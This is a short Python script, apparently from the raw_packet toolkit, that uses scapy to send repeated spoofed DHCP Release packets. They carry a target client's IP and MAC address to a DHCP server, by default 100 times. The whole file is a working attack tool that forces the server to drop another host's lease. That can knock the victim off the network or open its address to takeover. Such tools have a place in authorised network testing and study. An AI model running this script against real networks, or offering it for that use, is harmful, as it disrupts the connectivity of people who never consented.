from raw_packet.Utils.base import Base
from argparse import ArgumentParser
from raw_packet.Utils.network import DHCP_raw
from time import sleep
from scapy.all import sendp
from logging import getLogger, ERROR
getLogger("scapy.runtime").setLevel(ERROR)


if __name__ == "__main__":

    Base.check_platform()
    Base.check_user()
    PACKETS = []

    parser = ArgumentParser(description='DHCP Release raw packet sender')
    parser.add_argument('-i', '--interface', help='Set interface name for send discover packets')
    parser.add_argument('-c', '--client_ip', type=str, required=True, help='Set client IP address')
    parser.add_argument('-m', '--client_mac', type=str, help='Set client MAC address', default=None)
    parser.add_argument('-s', '--server_ip', type=str, required=True, help='Set DHCP server IP address')
    parser.add_argument('-n', '--number', type=int, default=100, help='Set number of packets; default=100')
    parser.add_argument('-d', '--delay', type=int, default=1, help='Set delay; default=1')
    args = parser.parse_args()

    current_network_interface = ""
    if args.interface is None:
        current_network_interface = Base.netiface_selection()
    else:
        current_network_interface = args.interface

    server_mac = Base.get_mac(current_network_interface, args.server_ip)
    if args.client_mac is None:
        client_mac = Base.get_mac(current_network_interface, args.client_ip)
    else:
        client_mac = args.client_mac

    dhcp = DHCP_raw()
    index = 0

    while index < args.number:
        release_packet = dhcp.make_release_packet(client_mac=client_mac, server_mac=server_mac,
                                                  client_ip=args.client_ip, server_ip=args.server_ip)
        sendp(release_packet, iface=current_network_interface, verbose=True)
        sleep(args.delay)
        index += 1
